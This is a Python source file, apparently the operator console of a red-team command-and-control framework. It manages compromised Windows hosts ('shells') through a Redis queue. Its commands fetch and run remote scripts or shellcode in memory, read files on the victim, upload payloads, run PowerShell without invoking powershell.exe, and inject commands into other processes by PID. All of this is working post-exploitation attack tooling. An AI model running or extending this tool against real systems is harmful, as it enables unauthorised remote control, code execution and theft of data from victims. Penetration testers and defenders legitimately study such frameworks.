"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/client.py
"""
import os
import time
import base64
from core.ui import UI
from core.utils import Utils
from core.log import Log
from core.alias import Alias

class Cli:

    def __init__(self, config):
        self.cmds = {}
        self.cmds["exit"] = self.exit_cli
        self.cmds["list"] = self.list_clients
        self.cmds["interact"] = self.interact
        self.cmds["show"] = self.view_event
        self.cmds["help"] = self.show_help
        self.cmds["kill"] = self.kill_shell
        
        self.shell_cmds = {}
        self.shell_cmds["help"] = self.show_help_shell
        self.shell_cmds["fetch"] = self.fetch
        self.shell_cmds["read"] = self.read_file
        self.shell_cmds["upload"] = self.upload_file
        self.shell_cmds["delay"] = self.update_delay
        self.shell_cmds["refresh"] = self.refresh
        self.shell_cmds["exec"] = self.exec_code
        self.shell_cmds["ps"] = self.ps
        self.shell_cmds["powerless"] = self.powerless
        self.shell_cmds["inject"] = self.inject
        self.shell_cmds["alias"] = self.set_alias

        self.config = config
        self.db = self.config.get("redis")

        self._prompt = "Main"
        self.guid = ""

        self.alias = Alias()

    def set_prompt(self, prompt):
        self._prompt = prompt

    def prompt(self):
        return UI.prompt(self._prompt)

    def set_guid(self, guid):
        self.guid = guid

    def set_interact(self, guid):
        self.guid = guid

    def parse_cmd(self, data):
        cmd = data.split(" ", 1)[0].lower()
        
        # interacting with a shell
        if not self.guid == "":
            if cmd == "background":
                self._prompt = "Main"
                self.guid = ""
            
            elif cmd == "exit":
                UI.error("*** You really want to kill this shell *** (yes/no)")
                if UI.prompt("Exit").lower() == "yes":
                    self.db.push_cmd(self.guid, "exit")
                    self._prompt = "Main"
                    self.guid = ""
            else:
                Log.log_shell(self.guid, "Sending", data)
                if self.shell_cmds.has_key(cmd):
                    callback = self.shell_cmds[cmd]
                    data = callback(data)

                if not (cmd == "help" or data == ""):
                    self.db.push_cmd(self.guid, data)
                    self.get_cmd_output()
                
        # interacting with the main console
        else:
            if self.cmds.has_key(cmd):
                callback = self.cmds[cmd]
                callback(data)
            else:
                UI.error("%s is not a valid command" % cmd)

    def exit_cli(self, data):
        os._exit(0)

    def list_clients(self, data):
        print "\nList of active shells\n-----------------------\n"
        for shell in self.db.get_all_shells():
            guid = shell.split(":")[0]
            timestamp = Utils.unix_to_date(self.db.get_data(shell))
            prompt = self.db.get_data("%s:prompt" % guid)
            id = self.db.get_data("%s:id" % guid)
            
            if not id == "":
                if Utils.get_arg_at(data, 1, 2) == "full":
                    print "  %s\t%s %s last seen %s" % (id, prompt, guid, timestamp)
                else:
                    print "  %s\t%s" % (id, prompt)
            
    def interact(self, data):
        current_id = Utils.get_arg_at(data, 1, 2)
        guid = ""
        for shell in self.db.get_all_shell_id():
            id = self.db.get_data(shell)
            if current_id == id:
                guid = shell.split(":")[0]
                break
            
        if not guid == "":
            self.guid = guid
            self._prompt = self.db.get_data("%s:prompt" % guid)
        else:
            UI.error("Invalid session ID")
            
    def view_event(self, data):
        log_path = Utils.get_arg_at(data, 1, 2)
        if log_path == "":
            UI.error("Missing arguments")
            return 
    
        log_path += ".log"
        
        rows = Utils.get_arg_at(data, 2, 2)
        if rows == "":
            rows = 10
        else:
            try:
                rows = int(rows)
            except:
                rows = 10
                
        log_path = Log.get_current_path(log_path)
        
        data = []
        
        if Utils.file_exists(log_path):
            for line in open(log_path, "rb").readlines():
                data.append(line)
            
            print "\nLast %d lines of log\n-----------------------\n" % rows    
            data = list(reversed(data))
            
            for i in range(0, rows):
                try:
                    print data[i]
                except:
                    pass
                
    def kill_shell(self, data):
        current_id = Utils.get_arg_at(data, 1, 2)
        guid = ""
        for shell in self.db.get_all_shell_id():
            id = self.db.get_data(shell)
            if current_id == id:
                guid = shell.split(":")[0]
                break
            
        if not guid == "":
            self.db.delete_all_by_guid(guid)
            print "Deleting shell with ID %s" % current_id
        else:
            UI.error("Invalid session ID")

    def show_help(self, data):
        print "\nHelp Menu\n-----------------------\n"
        print "\tlist      args (full)             List all active shells"
        print "\tinteract  args (id)               Interact with a session"
        print "\tshow      args (error/http/event, count)  Show error, http or event log (default number of rows 10)"
        print "\tkill      args (id)               Kill shell (clear db only)"
        print "\texit                              Exit the application"
        print "\thelp                              Show this help menu"
        
    # shell commands start here
    def get_cmd_output(self):
        timestamp = time.time()
        while int(time.time() - timestamp) < int(self.config.get("max-output-timeout")):
            output = self.db.get_output(self.guid)
            if len(output) >= 1:
                for item in output:
                    print item
                break

    def show_help_shell(self, data):
        print "\nShell Help Menu\n-----------------------\n"
        print "\tbackground                              Return to the main console"
        print "\trefresh                                 Check for previous commands output"
        print "\tfetch         args (path/url, command)  In memory execution of a script and execute a commmand"
        print "\texec          args (path/url)           In memory execution of code (shellcode)"
        print "\tread          args (remote path)        Read a file on the remote host"
        print "\tupload        args (path/url, path)     Upload a file on the remote system"
        print "\tps                                      List processes"
        print "\tpowerless     args (powershell)         Execute Powershell command without invoking Powershell"
        print "\tinject        args (pid, command)       Inject command into a target process (max length 4096)"
        print "\talias         args (key, value)         Create an alias to avoid typing the same thing over and over"
        print "\tdelay         args (milliseconds)       Update the callback delay"
        print "\thelp                                    Show this help menu"
        self.alias.list_alias()
        self.alias.list_custom_alias()
        
    def fetch(self, data):
        try:
            cmd, path, ps = data.split(" ", 2)
        except:
            UI.error("Missing arguments")
            return ""
        
        data = ";"
        path = self.alias.get_alias(path)
        if Utils.file_exists(path, False, False):
            data = Utils.load_file_unsafe(path)
        else:
            data = Utils.download_url(path)
            
        if not data == ";":
            UI.success("Fetching %s" % path)
            UI.success("Executing %s" % ps)
        
            return "%s;%s" % (data, ps)
        else:
            UI.error("Cannot fetch the resource")
            return ""
        
    def read_file(self, data):
        try:
            cmd, path = data.split(" ", 2)
            return "Get-Content %s" % path
        except:
            UI.error("Missing arguments")
            return ""
        
    def upload_file(self, data):
        try:
            cmd, path, remote = data.split(" ", 2)
        except:
            UI.error("Missing arguments")
            return ""
        
        data = ";"
        path = self.alias.get_alias(path)
        if Utils.file_exists(path, False, False):
            data = Utils.load_file_unsafe(path)
        else:
            data = Utils.download_url(path)     
            
        if not data == ";":
            UI.success("Fetching %s" % path)
            
            data = base64.b64encode(data)
            ps = Utils.load_powershell_script("upload.ps1", 3)
            ps = Utils.update_key(ps, "PAYLOAD", data)
            ps = Utils.update_key(ps, "PATH", remote)
            UI.success("Payload will be saved at %s" % path)
            return ps
        else:
            UI.error("Cannot fetch the resource")
            return data
    
    def exec_code(self, data):
        try:
            cmd, path = data.split(" ", 1)
        except:
            UI.error("Missing arguments")
            return ""
        
        data = ";"
        path = self.alias.get_alias(path)
        if Utils.file_exists(path, False, False):
            data = Utils.load_file_unsafe(path)
        else:
            data = Utils.download_url(path)     
            
        if not data == ";":
            UI.success("Fetching %s" % path)
            
            data = base64.b64encode(data)
            ps = Utils.load_powershell_script("exec.ps1", 16)
            ps = Utils.update_key(ps, "PAYLOAD", data)
            UI.success("Payload should be executed shortly on the target")
            return ps
        else:
            UI.error("Cannot fetch the resource")
            return data

    def powerless(self, data):
        try:
            cmd, ps_cmd = data.split(" ", 1)
        except:
            UI.error("Missing arguments")
            return ""
               
        ps = Utils.load_powershell_script("powerless.ps1", 22)
        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(ps_cmd))
        return ps


    def inject(self, data):
        try:
            option, pid, cmd = data.split(" ", 2)
        except:
            UI.error("Missing arguments")
            return ""
   
        ps = Utils.load_powershell_script("injector.ps1", 1)
        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(cmd))
        ps = Utils.update_key(ps, "PID", pid)
        UI.success("Injecting %s" % cmd)
        UI.success("Into process with PID %s" % pid)
        return ps
    
    def ps(self, data):
        ps = Utils.load_powershell_script("ps.ps1", 0)
        return ps
    
    def update_delay(self, data):
        delay = Utils.get_arg_at(data, 1, 2)
        print "Updating delay to %s" % delay
        return "delay %s" % delay
    
    def refresh(self, data):
        for item in self.db.get_output(self.guid):
            print item
        return ""

    def set_alias(self, data):
        try:
             cmd, key, value = data.split(" ", 2)
        except:
            UI.error("Missing arguments")
            return ""    
        
        self.alias.set_custom(key, value)
        UI.success("%s is now set to %s" % (key, value))
           
        return ""
